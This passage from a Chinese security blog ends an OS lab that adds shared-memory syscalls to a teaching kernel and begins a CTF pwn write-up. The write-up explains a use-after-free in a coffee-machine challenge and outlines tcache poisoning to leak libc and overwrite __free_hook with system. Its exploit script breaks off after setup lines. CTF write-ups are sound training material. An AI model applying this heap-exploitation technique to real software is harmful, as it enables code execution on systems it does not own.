<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct_shm_tables</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> name[SHM_NAME_SIZE];</span><br><span class="line">	<span class="keyword">long</span> addr;</span><br><span class="line">&#125; shm_tables[SHM_COUNT];</span><br></pre></td></tr></table></figure>
<p>基础字符串函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp_shm</span><span class="params">(<span class="keyword">char</span>* name,<span class="keyword">char</span>* tmp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">20</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(name[i] != tmp[i]) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(tmp[i] ==<span class="string">&#x27;\0&#x27;</span> &amp;&amp; name[i] == <span class="string">&#x27;\0&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcpy_shm</span><span class="params">(<span class="keyword">char</span>* name,<span class="keyword">char</span>* tmp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">20</span>; i++)&#123;</span><br><span class="line">		name[i] = tmp[i];</span><br><span class="line">        <span class="keyword">if</span>(tmp[i] ==<span class="string">&#x27;\0&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_shm_location</span><span class="params">(<span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SHM_COUNT; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (!strcmp_shm(name, shm_tables[i].name))&#123;</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统调用 sys_shmget：获取一片共享内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_shmget</span><span class="params">(<span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, shmid;</span><br><span class="line">	<span class="keyword">char</span> tmp[SHM_NAME_SIZE];</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SHM_NAME_SIZE; i++)&#123;</span><br><span class="line">		tmp[i] = get_fs_byte(name + i);</span><br><span class="line">		<span class="keyword">if</span> (tmp[i] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	shmid = find_shm_location(tmp);</span><br><span class="line">	<span class="keyword">if</span> (shmid != <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> shmid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SHM_COUNT; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (shm_tables[i].name[<span class="number">0</span>] == <span class="string">&quot;\0&quot;</span>)&#123;</span><br><span class="line">			strcpy_shm(shm_tables[i].name, tmp);</span><br><span class="line">			shm_tables[i].addr = get_free_page(); <span class="comment">/* 获取一个空闲的页帧 */</span></span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	printk(<span class="string">&quot;SHM Number limited!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统调用 sys_shmat：映射一片共享内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sys_shmat</span><span class="params">(<span class="keyword">int</span> shmid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (shm_tables[shmid].name[<span class="number">0</span>] == <span class="string">&quot;\0&quot;</span>)&#123;</span><br><span class="line">		printk(<span class="string">&quot;SHM not exists!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	put_page(shm_tables[shmid].addr, current-&gt;brk + current-&gt;start_code); <span class="comment">/* 创建页表,建立起虚拟地址到物理地址的映射关系 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)current-&gt;brk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后修改 makefile：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OBJS  = sched.o system_call.o traps.o <span class="keyword">asm</span>.o fork.o \</span><br><span class="line">	panic.o printk.o <span class="built_in">vsprintf</span>.o sys.o <span class="built_in">exit</span>.o \</span><br><span class="line">	signal.o mktime.o sem.o shm.o</span><br><span class="line">	</span><br><span class="line">sem.s sem.o: sem.c ../include/linux/kernel.h ../include/unistd.h</span><br><span class="line">shm.s shm.o: shm.c ../include/linux/kernel.h ../include/unistd.h</span><br></pre></td></tr></table></figure>
<p>接下来我们需要修改上一个实验的生产者-消费者程序，并用共享内存做缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>   __LIBRARY__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">_syscall2(<span class="keyword">int</span>,sem_open,<span class="keyword">const</span> <span class="keyword">char</span> *,name,<span class="keyword">unsigned</span> <span class="keyword">int</span>,value);</span><br><span class="line">_syscall1(<span class="keyword">int</span>,sem_wait,<span class="keyword">int</span>,sem);</span><br><span class="line">_syscall1(<span class="keyword">int</span>,sem_post,<span class="keyword">int</span>,sem);</span><br><span class="line">_syscall1(<span class="keyword">int</span>,sem_unlink,<span class="keyword">const</span> <span class="keyword">char</span> *,name);</span><br><span class="line"></span><br><span class="line">_syscall1(<span class="keyword">int</span>,shmget,<span class="keyword">char</span>*,name);</span><br><span class="line">_syscall1(<span class="keyword">int</span>,shmat,<span class="keyword">int</span>,shmid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> consumerNum = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> itemNum = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> bufSize = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> buf_in = <span class="number">0</span>,buf_out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sem_empty, sem_full, sem_mutex;</span><br><span class="line">    <span class="keyword">int</span> *buffer;</span><br><span class="line">    <span class="keyword">int</span> shmid;</span><br><span class="line">    <span class="keyword">int</span> stat;</span><br><span class="line">    <span class="keyword">pid_t</span> p;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sem_empty = sem_open(<span class="string">&quot;empty&quot;</span>,<span class="number">1</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;empty error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sem_full = sem_open(<span class="string">&quot;full&quot;</span>,<span class="number">0</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;full error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sem_mutex = sem_open(<span class="string">&quot;mutex&quot;</span>,<span class="number">10</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mutex error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    shmid = shmget(<span class="string">&quot;buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(p = fork()))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A(%d) create\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        buffer = (<span class="keyword">int</span> *)shmat(shmid);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; itemNum; i++)&#123;</span><br><span class="line">            sem_wait(sem_empty);</span><br><span class="line">            sem_wait(sem_mutex);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;A(%d) &gt;&gt; buf_in:%d\n&quot;</span>,<span class="number">0</span>,buf_in);</span><br><span class="line">            buffer[<span class="number">0</span>] = buf_in;</span><br><span class="line">            buf_in = (buf_in+<span class="number">1</span>) % bufSize;</span><br><span class="line"></span><br><span class="line">            sem_post(sem_mutex);</span><br><span class="line">            sem_post(sem_full);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A(%d) done\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; consumerNum; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(p = fork()))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;B(%d) create\n&quot;</span>,j);</span><br><span class="line">            buffer = (<span class="keyword">int</span> *)shmat(shmid);</span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; itemNum/consumerNum; k++)&#123;</span><br><span class="line">                sem_wait(sem_full);</span><br><span class="line">                sem_wait(sem_mutex);</span><br><span class="line"></span><br><span class="line">                buf_out = buffer[<span class="number">0</span>];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;B(%d) &gt;&gt; buf_out:%d\n&quot;</span>,j,buf_out);</span><br><span class="line"></span><br><span class="line">                buf_out = (buf_out + <span class="number">1</span>) % bufSize;</span><br><span class="line">                buffer[<span class="number">0</span>] = buf_out;</span><br><span class="line"></span><br><span class="line">                sem_post(sem_mutex);</span><br><span class="line">                sem_post(sem_empty);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;B(%d) done\n&quot;</span>,j);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((wait(&amp;stat)) &gt; <span class="number">0</span>); </span><br><span class="line">    sem_unlink(<span class="string">&quot;empty&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;full&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;mutex&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;all done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有一个点需要注意，由于共享页面同时存在于两个进程中，因此会在 <code>do_exit</code> 中被释放两次</p>
<p>为了不触发内核报错，这里需要修改 <code>free_page</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (addr &lt; LOW_MEM) <span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (addr &gt;= HIGH_MEMORY)</span><br><span class="line">		panic(<span class="string">&quot;trying to free nonexistent page&quot;</span>);</span><br><span class="line">	addr -= LOW_MEM;</span><br><span class="line">	addr &gt;&gt;= <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">	mem_map[addr] = mem_map[addr] &amp; ~(<span class="number">1</span>) ; </span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	if (mem_map[addr]--) return;</span></span><br><span class="line"><span class="comment">	mem_map[addr]=0;</span></span><br><span class="line"><span class="comment">	panic(&quot;trying to free free page&quot;);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终的效果如下：</p>
<img src="/2023/11/08/HIT-OSLab6/1699440187243.png" class width="1699440187243">  

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/07/%E9%B9%8F%E7%A8%8B%E6%9D%AFCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/07/%E9%B9%8F%E7%A8%8B%E6%9D%AFCTF2023/" class="post-title-link" itemprop="url">鹏程杯CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-07 23:40:31 / Modified: 23:41:56" itemprop="dateCreated datePublished" datetime="2023-11-07T23:40:31+08:00">2023-11-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>22k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=b65a1033a56d36412b5e4993b0c7f4f4f2e685bf, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>题目维护了两个数组 <code>copy_left_coffee</code> 和 <code>left_coffee</code>，分别存放 user 和 root 状态下的数据</p>
<p>大多数函数在执行之前都会先根据当前状态进行切换，但 <code>change_default</code> 没有：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">show_list();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input the id you want to change&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">id = atol(buf) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( id &lt; <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input which coffee you want to change&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  index = atol(buf) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">5</span> || copy_left_coffee[id][index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, copy_left_coffee[id][index], <span class="number">0x80</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">    update(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;invalid coffee&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这意味着在 user 状态下释放 chunk 时，数据不会同步到 root 状态，这就造成了 UAF</p>
<p><strong>入侵思路</strong></p>
<p>程序中只有一个地方可以用来泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( coffee_list[i].num )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d.%s:%d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>), coffee_list[i].name, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)coffee_list[i].num);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d.%s:SOLD OUT!\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>), coffee_list[i].name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>劫持 tcachebin 为 coffee_list 就可以泄露 libc_base</p>
<p>最后劫持 tcachebin 为 free_hook，写入 system 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span 